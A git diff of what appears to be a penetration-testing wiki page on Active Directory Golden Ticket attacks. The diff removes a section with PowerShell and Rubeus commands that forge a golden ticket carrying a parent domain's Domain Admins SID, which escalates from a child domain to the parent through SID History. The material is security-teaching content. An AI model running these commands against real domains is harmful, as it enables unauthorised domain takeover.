@@ -48,22 +48,6 @@ Your user is now in the most privileged group in the Active Directory, including
 {: .warning }
 > If you want to connect remotely to a machine, **use the hostname, not the IP.** Golden Tickets attack consists in leveraging Kerberos authentication by performing [Overpass The Hash](/ad/overpassthehash/). If you specify the IP of the target, you’ll force NTLM authentication, which will fail.
 
-In the case where you are Domain Admin in a child domain, you can become Domain Admin in the parent domain using SID History. This attack is also possible for [Diamond Tickets](/ad/diamond/)
-
-```powershell
-# Get trust information.
-Get-DomainTrust
-
-# Get the SID of Domain Admin group.
-$DomainAdminSID = Get-DomainGroup -Identity "Domain Admins" -Domain $ParentDomain -Properties ObjectSid
-
-# Forge the golden ticket 
-.\Rubeus.exe golden /aes256:$hash /user:$username /domain:$ChildDomain /sid:$sid /sids:$DomainAdminSID /nowrap
-```
-
-{: .important }
-> Note that in the case you are facing 3 domains with transitive relationships (A -> B -> C), if you are Domain Admin in domain C, you can leverage SID History to directly escalate your privileges in domain A.
-
 ## Recommendations
 
 - [ ] Nothing to do here, simply don't disclose `krbtgt` hash.
